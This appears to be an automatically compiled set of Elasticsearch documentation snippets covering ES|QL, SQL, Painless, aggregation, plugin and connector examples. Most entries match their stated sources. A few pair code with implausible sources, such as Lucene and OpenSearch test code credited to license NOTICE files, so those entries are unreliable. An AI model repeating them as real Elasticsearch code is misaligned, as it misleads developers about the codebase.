../examples/to_geopoint.md\n:::\n```\n\n----------------------------------------\n\nTITLE: ELSER-Based Semantic Search Query in Elasticsearch\nDESCRIPTION: Example of a text expansion query using the ELSER model for semantic search. It searches for documents semantically matching the query \"How is the weather in Jamaica?\" using the ml.tokens field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-text-expansion-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n   \"query\":{\n      \"text_expansion\":{\n         \"ml.tokens\":{\n            \"model_id\":\".elser_model_2\",\n            \"model_text\":\"How is the weather in Jamaica?\"\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Median Absolute Deviation Query in Elasticsearch\nDESCRIPTION: Example showing how to calculate median absolute deviation for product reviews ratings. Uses basic aggregation to compute both average and variability of ratings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-median-absolute-deviation-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET reviews/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"review_average\": {\n      \"avg\": {\n        \"field\": \"rating\"\n      }\n    },\n    \"review_variability\": {\n      \"median_absolute_deviation\": {\n        \"field\": \"rating\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying TANH Function to a Numeric Value in ESQL\nDESCRIPTION: This example demonstrates how to use the TANH function in ESQL to calculate the hyperbolic tangent of a numeric value. The snippet creates a row with a double value and applies the TANH function to it, returning the result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/tanh.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL tanh=TANH(a)\n```\n\n----------------------------------------\n\nTITLE: Boxplot Aggregation with Runtime Field in Elasticsearch\nDESCRIPTION: This snippet illustrates how to use a runtime field to convert milliseconds to seconds before performing a boxplot aggregation in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-boxplot-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"load_time.seconds\": {\n      \"type\": \"long\",\n      \"script\": {\n        \"source\": \"emit(doc['load_time'].value / params.timeUnit)\",\n        \"params\": {\n          \"timeUnit\": 1000\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"load_time_boxplot\": {\n      \"boxplot\": { \"field\": \"load_time.seconds\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: INFO Level Logging Example in Elasticsearch (Java)\nDESCRIPTION: Demonstrates INFO level logging in Elasticsearch, used for recording important events in the cluster's lifecycle that are enabled by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_16\n\nLANGUAGE: java\nCODE:\n```\nlogger.info(\n    \"{} index template [{}] for index patterns {}\",\n    existing == null ? \"adding\" : \"updating\",\n    name,\n    template.indexPatterns()\n);\n```\n\n----------------------------------------\n\nTITLE: Displaying Elasticsearch Plugin Help Command for Self-Managed Deployments\nDESCRIPTION: Command to display usage instructions for the elasticsearch-plugin tool in self-managed Elasticsearch deployments. The tool is located in the $ES_HOME/bin directory and requires appropriate permissions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/plugin-management.md#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nsudo bin/elasticsearch-plugin -h\n```\n\n----------------------------------------\n\nTITLE: Querying Recent Data in Elasticsearch using ESQL\nDESCRIPTION: This ESQL query retrieves data from the 'sample_data' index, filtering for records within the last hour. It uses the NOW() function and a time comparison to limit the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/date.csv-spec/docsNowWhere.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE @timestamp > NOW() - 1 hour\n```\n\n----------------------------------------\n\nTITLE: Updating an Elasticsearch Plugin\nDESCRIPTION: Commands to update an Elasticsearch plugin by first removing the existing version and then installing the new version. Most plugins are built for specific Elasticsearch versions and must be reinstalled after Elasticsearch updates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/listing-removing-updating.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nsudo bin/elasticsearch-plugin remove [pluginname]\nsudo bin/elasticsearch-plugin install [pluginname]\n```\n\n----------------------------------------\n\nTITLE: Specifying Sort Tiebreaker in EQL Search for Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the tiebreaker_field parameter to specify a field for sorting events with the same timestamp in an EQL search query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"tiebreaker_field\": \"event.sequence\",\n  \"query\": \"\"\"\n    process where process.name == \"cmd.exe\" and stringContains(process.executable, \"System32\")\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring IP Location Processor Pipeline in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to set up an ingest pipeline using the IP location processor to add geographical information based on an IP address field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ip-location-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/ip_location\n{\n  \"description\" : \"Add ip geolocation info\",\n  \"processors\" : [\n    {\n      \"ip_location\" : {\n        \"field\" : \"ip\"\n      }\n    }\n  ]\n}\nPUT my-index-000001/_doc/my_id?pipeline=ip_location\n{\n  \"ip\": \"89.160.20.128\"\n}\nGET my-index-000001/_doc/my_id\n```\n\n----------------------------------------\n\nTITLE: Auto Date Histogram with Custom Date Format in Elasticsearch\nDESCRIPTION: Example of an auto date histogram aggregation with a custom date format. The aggregation specifies a format pattern of 'yyyy-MM-dd' for the returned dates, along with a target of 5 buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-autodatehistogram-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"auto_date_histogram\": {\n        \"field\": \"date\",\n        \"buckets\": 5,\n        \"format\": \"yyyy-MM-dd\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Left Shift with the Def Type in Painless\nDESCRIPTION: This snippet shows how to use the left shift operator with the def type in Painless, detailing the implicit casting that occurs and the resulting values after shifting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_25\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 4 << 2; <1>\ndef y = x << 1; <2>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Lucene Numeric Equality Comparison in Java\nDESCRIPTION: This code snippet shows how Lucene identifies numeric equality through the same encoded string representation, explaining that equality is determined by matching the same sortable encoded representation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-cloud-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nNumericRangeQuery<Long> query = NumericRangeQuery.newLongRange(\"my_field\", 10L, 10L, true, true);\nquery.toString(); // my_field:[10 TO 10]\n```\n\n----------------------------------------\n\nTITLE: CHANGE_POINT Syntax in Elasticsearch SQL\nDESCRIPTION: Defines the syntax for the CHANGE_POINT command, which detects spikes, dips, and change points in a metric. It specifies the required 'value' parameter and optional 'key', 'type_name', and 'pvalue_name' parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/change_point.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nCHANGE_POINT value [ON key] [AS type_name, pvalue_name]\n```\n\n----------------------------------------\n\nTITLE: Using _count Special Path in Pipeline Aggregation\nDESCRIPTION: Example showing how to use the special _count path to calculate derivatives based on document counts instead of specific metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/pipeline.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"timestamp\",\n        \"calendar_interval\": \"day\"\n      },\n      \"aggs\": {\n        \"the_deriv\": {\n          \"derivative\": { \"buckets_path\": \"_count\" } <1>\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Document with ML Processing Results\nDESCRIPTION: API call to retrieve a document that has been processed by a language identification pipeline. The response includes the original text and the predicted language field added by the ML model.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nGET my_index/_doc/1\n```\n\n----------------------------------------\n\nTITLE: Gradle command to inspect registered metric names\nDESCRIPTION: This snippet shows how to run a gradle command to print out all previously registered metric names, which can be useful for finding existing groups for new metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/NAMING.md#2025-04-21_snippet_12\n\nLANGUAGE: gradle\nCODE:\n```\n\"./gradlew run -Dtests.es.logger.org.elasticsearch.telemetry.apm=debug\"\n```\n\n----------------------------------------\n\nTITLE: Customizing Keyword Analyzer in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to recreate and customize the keyword analyzer as a custom analyzer in Elasticsearch. It provides a starting point for further customization by adding token filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keyword-analyzer.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /keyword_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"rebuilt_keyword\": {\n          \"tokenizer\": \"keyword\",\n          \"filter\": [         <1>\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Counting with Boolean Expressions and NULL Handling in ESQL\nDESCRIPTION: This snippet shows how to count based on two different boolean expressions using the pattern COUNT(<expression> OR NULL). It leverages three-valued logic and NULL handling in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nROW n=1\n| STATS COUNT(n > 0 OR NULL), COUNT(n < 0 OR NULL)\n```\n\n----------------------------------------\n\nTITLE: Type Support Matrix in Markdown\nDESCRIPTION: A markdown table defining the supported field types and their result types for an ESQL function. Shows that ip, keyword, and text fields all result in ip type output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_ip.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | options | result |\n| --- | --- | --- |\n| ip | | ip |\n| keyword | | ip |\n| text | | ip |\n```\n\n----------------------------------------\n\nTITLE: Case-Sensitive String Contains Check - Elasticsearch\nDESCRIPTION: Filters `process` events where the `process_name` contains the substring 'foo'. Uses Elasticsearch's `wildcard` query for case-sensitive matching with specified pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_7\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\"bool\":{\"must\":[{\"term\":{\"event.category\":{\"value\":\"process\"}}},{\"wildcard\":{\"process_name\":{\"wildcard\":\"*foo*\",\"boost\":1.0}}}],\"boost\":1.0}}\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Function Parameter in Markdown\nDESCRIPTION: This snippet defines a parameter named 'field' for an ESQL function using Markdown syntax. The parameter description is left empty, indicating that no additional information is provided about its purpose or usage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/st_centroid_agg.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`field`\n:   \n```\n\n----------------------------------------\n\nTITLE: Defining a Dissect Pattern for Log Parsing in Elasticsearch\nDESCRIPTION: A sample dissect pattern for parsing common log formats. The pattern matches specific parts of a log line and captures named fields like clientip, timestamp, verb, and status.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dissect-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\n%{clientip} %{ident} %{auth} [%{@timestamp}] \\\"%{verb} %{request} HTTP/%{httpversion}\\\" %{status} %{size}\n```\n\n----------------------------------------\n\nTITLE: Standard Elasticsearch License Header\nDESCRIPTION: Default license header required for most Java files in the Elasticsearch codebase except x-pack directory\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_7\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one\n * or more contributor license agreements. Licensed under the \"Elastic License\n * 2.0\", the \"GNU Affero General Public License v3.0 only\", and the \"Server Side\n * Public License v 1\"; you may not use this file except in compliance with, at\n * your election, the \"Elastic License 2.0\", the \"GNU Affero General Public\n * License v3.0 only\", or the \"Server Side Public License, v 1\".\n */\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Substring Function Parameters in Markdown\nDESCRIPTION: This snippet defines the parameters for the ESQL substring function. It specifies two parameters: 'string' (the input string) and 'length' (the number of characters to return).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/right.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`string`\n:   The string from which to returns a substring.\n\n`length`\n:   The number of characters to return.\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Parameter documentation template showing the field parameter definition and its accepted input types. The template indicates this is auto-generated content that shouldn't be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/to_unsigned_long.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`field`\n:   Input value. The input can be a single- or multi-valued column or an expression.\n```\n\n----------------------------------------\n\nTITLE: Calculating Cosine Value with COS Function in ESQL\nDESCRIPTION: This example demonstrates how to use the COS function in ESQL to calculate the cosine of a numeric value. It creates a row with a value of 1.8 and then applies the COS function to obtain the cosine of that value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/cos.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL cos=COS(a)\n```\n\n----------------------------------------\n\nTITLE: Calculating Average Salary Change using ESQL\nDESCRIPTION: This ESQL query computes the average salary change for employees. It uses the STATS clause with AVG and MV_AVG functions, and rounds the result to 10 decimal places.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/docsStatsAvgNestedExpression.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS avg_salary_change = ROUND(AVG(MV_AVG(salary_change)), 10)\n```\n\n----------------------------------------\n\nTITLE: Bitwise And with Different Integer Types in Painless\nDESCRIPTION: This snippet demonstrates the bitwise and operator in Painless, detailing how to apply the operator across different integer types while outlining the expected results and type promotions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_30\n\nLANGUAGE: painless\nCODE:\n```\nint i = 5 & 6;   <1>\nlong l = i & 5L; <2>\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Documentation\nDESCRIPTION: Documentation for the 'point' parameter which accepts geographic and cartesian data types. The parameter is nullable and returns null when null input is provided.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/st_xmax.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`point`\n:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Index Response with Pipeline Processing\nDESCRIPTION: Shows the response from the Elasticsearch server after indexing a document with pipeline processing. The response confirms that the document was successfully created.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/pipeline-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_index\": \"my-index-000001\",\n  \"_id\": \"1\",\n  \"_version\": 1,\n  \"result\": \"created\",\n  \"_shards\": {\n    \"total\": 2,\n    \"successful\": 1,\n    \"failed\": 0\n  },\n  \"_seq_no\": 66,\n  \"_primary_term\": 1\n}\n```\n\n----------------------------------------\n\nTITLE: Run ES Node Manually for Debugging and Testing\nDESCRIPTION: This command runs an ElasticSearch node manually with JVM debugging enabled. This setup is useful for debugging the server during the test execution of EQL correctness tests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew :x-pack:plugin:eql:qa:correctness:runEqlCorrectnessNode --debug-jvm\n```\n\n----------------------------------------\n\nTITLE: Creating Outlook Connector via Elasticsearch API\nDESCRIPTION: This snippet demonstrates how to create a new self-managed Outlook connector using the Elasticsearch Create connector API. It specifies the index name, connector name, and service type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-outlook.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _connector/my-outlook-connector\n{\n  \"index_name\": \"my-elasticsearch-index\",\n  \"name\": \"Content synced from Outlook\",\n  \"service_type\": \"outlook\"\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Parent (Question) Document in Elasticsearch\nDESCRIPTION: This snippet shows how to index a parent document (question) with tags and other relevant fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-children-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT child_example/_doc/1\n{\n  \"join\": {\n    \"name\": \"question\"\n  },\n  \"body\": \"<p>I have Windows 2003 server and i bought a new Windows 2008 server...\",\n  \"title\": \"Whats the best way to file transfer my site from server to a newer one?\",\n  \"tags\": [\n    \"windows-server-2003\",\n    \"windows-server-2008\",\n    \"file-transfer\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Invalid HISTOGRAM Function with Nested Functions in Elasticsearch SQL\nDESCRIPTION: Shows an invalid SQL statement where a function (MONTH) is applied to the HISTOGRAM result in the GROUP BY clause, which is not supported.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-grouping.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MONTH(HISTOGRAM(birth_date), 2)) AS h, COUNT(*) as c FROM emp GROUP BY h ORDER BY h DESC;\n```\n\n----------------------------------------\n\nTITLE: Monthly Sales to Daily Rate Query\nDESCRIPTION: Shows how to calculate total monthly sales and convert them to average daily sales rates using field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-rate-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"by_date\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"avg_price\": {\n          \"rate\": {\n            \"field\": \"price\",\n            \"unit\": \"day\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using BETWEEN Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates the BETWEEN operator which tests if a value falls within a specified range. The example selects last_name from test_emp where emp_no is between 9990 and 10003.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no BETWEEN 9990 AND 10003 ORDER BY emp_no;\n```\n\n----------------------------------------\n\nTITLE: Quality Assurance Module Configuration\nDESCRIPTION: Configuration for various testing and quality assurance modules across different Elasticsearch components\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_3\n\nLANGUAGE: Gradle\nCODE:\n```\nproject ':x-pack:qa:core-rest-tests-with-security'\n```\n\n----------------------------------------\n\nTITLE: Including Markdown Files for FROM_BASE64 Function Documentation\nDESCRIPTION: These snippets use a custom Markdown include directive to incorporate separate files containing parameter details, function description, supported types, and usage examples for the FROM_BASE64 function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/from_base64.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/from_base64.md\n:::\n```\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/from_base64.md\n:::\n```\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/from_base64.md\n:::\n```\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/from_base64.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Indexing Pages with Title Filter - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet is used to filter and index every page in Notion where the title includes 'Demo Page'. It helps in setting up sync rules for content indexing based on page properties.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"searches\": [\n    {\n      \"filter\": {\n        \"value\": \"page\"\n      },\n      \"query\": \"Demo Page\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Decoding Base64 String using FROM_BASE64 in ESQL\nDESCRIPTION: This snippet demonstrates how to use the FROM_BASE64 function to decode a base64 encoded string in ESQL. It creates a row with a base64 encoded value and then decodes it using the FROM_BASE64 function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/from_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"ZWxhc3RpYw==\"\n| EVAL d = FROM_BASE64(a)\n```\n\n----------------------------------------\n\nTITLE: Generating Random Latitude for Elasticsearch Geo Testing in Java\nDESCRIPTION: This method creates a random latitude value for geospatial testing. It ensures the generated value is within the valid range of -90 to 90 degrees.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/arrow/licenses/checker-qual-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\npublic static double randomLatitude() {\n    return OpenSearchTestCase.randomDouble() * 180 - 90;\n}\n```\n\n----------------------------------------\n\nTITLE: Token Filter Output Example\nDESCRIPTION: Shows the output tokens produced by the hyphenation_decompounder filter when processing the word 'Kaffeetasse'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-hyp-decomp-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ Kaffeetasse, Kaffee, tasse ]\n```\n\n----------------------------------------\n\nTITLE: Example of LOG10 Function Usage\nDESCRIPTION: Shows two equivalent ways to calculate the base-10 logarithm: using LOG10() directly or dividing LOG() by LOG(10), demonstrating the relationship between natural and base-10 logarithms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LOG10(5), LOG(5)/LOG(10);\n\n     LOG10(5)     |    LOG(5)/LOG(10)\n------------------+-----------------------\n0.6989700043360189|0.6989700043360187\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice\nDESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. This notice should be customized with the appropriate copyright year and owner information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-zip-commons-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n```\n\n----------------------------------------\n\nTITLE: Thread Watchdog Warning Log Example\nDESCRIPTION: Example log output from the ThreadWatchdog showing warnings about network threads not making progress, including base64-encoded thread dump information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_20\n\nLANGUAGE: text\nCODE:\n```\n[WARN ][o.e.c.n.ThreadWatchdog   ] the following threads are active but did not make progress in the preceding [5s]: [elasticsearch[instance-0000000004][transport_worker][T#1]]]\n[WARN ][o.e.c.n.ThreadWatchdog   ] hot threads dump due to active threads not making progress [part 1]: H4sIAAAAAAAA/+1aa2/bOBb93l8hYLUYFWgYvWw5AQbYpEkn6STZbJyiwAwGA1qiY8US6ZJUHvPr90qk/JJky41TtDMuUIci...\n[WARN ][o.e.c.n.ThreadWatchdog   ] hot threads dump due to active threads not making progress [part 2]: LfXL/x70a3eL8ve6Ral74ZBrp5x7HmUD9KXQz1MaXUNfFC6SeEysxSw1cNXL9JXYl3AigAE7ywbm/AZ+ll3Ox4qXJHNjVr6h...\n[WARN ][o.e.c.n.ThreadWatchdog   ] hot threads dump due to active threads not making progress (gzip compressed, base64-encoded, and split into 2 parts on preceding log lines; ...\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Standard Analyzer in Elasticsearch\nDESCRIPTION: This example shows how to configure a custom standard analyzer with a maximum token length of 5 and English stop words. It includes the index creation and a sample analysis using the custom analyzer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-standard-analyzer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_english_analyzer\": {\n          \"type\": \"standard\",\n          \"max_token_length\": 5,\n          \"stopwords\": \"_english_\"\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_english_analyzer\",\n  \"text\": \"The 2 QUICK Brown-Foxes jumped over the lazy dog's bone.\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ 2, quick, brown, foxes, jumpe, d, over, lazy, dog's, bone ]\n```\n\n----------------------------------------\n\nTITLE: Sample Copyright Header Template for Source Files\nDESCRIPTION: Template for the standard GPL copyright notice that should be included at the start of source files, including program name, copyright statement, and license terms.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/jakarta.mail-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Using REPEAT Function in Elasticsearch SQL\nDESCRIPTION: Returns a character string composed of a specified string repeated a specified number of times. Returns null if the count is 0, negative, or null, with a limit of 1 MB for the resulting string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nREPEAT(\n    string_exp, <1>\n    count)      <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT REPEAT('La', 3);\n\n REPEAT('La', 3)\n----------------\nLaLaLa\n```\n\n----------------------------------------\n\nTITLE: ABS Function with Table Data and Expression\nDESCRIPTION: Shows how to use the ABS function with employee data, keeping specific columns and calculating the absolute difference between height values and zero.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/abs.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, height\n| EVAL abs_height = ABS(0.0 - height)\n```\n\n----------------------------------------\n\nTITLE: WriteField Class for Document Fields Management\nDESCRIPTION: This snippet introduces the org.elasticsearch.script.field.WriteField class, which encapsulates methods for managing document fields in Elasticsearch. It includes various methods for getting, setting, appending, and transforming field values, along with functions for checking existence and size of fields, allowing detailed manipulation of document data.\nSOURCE: 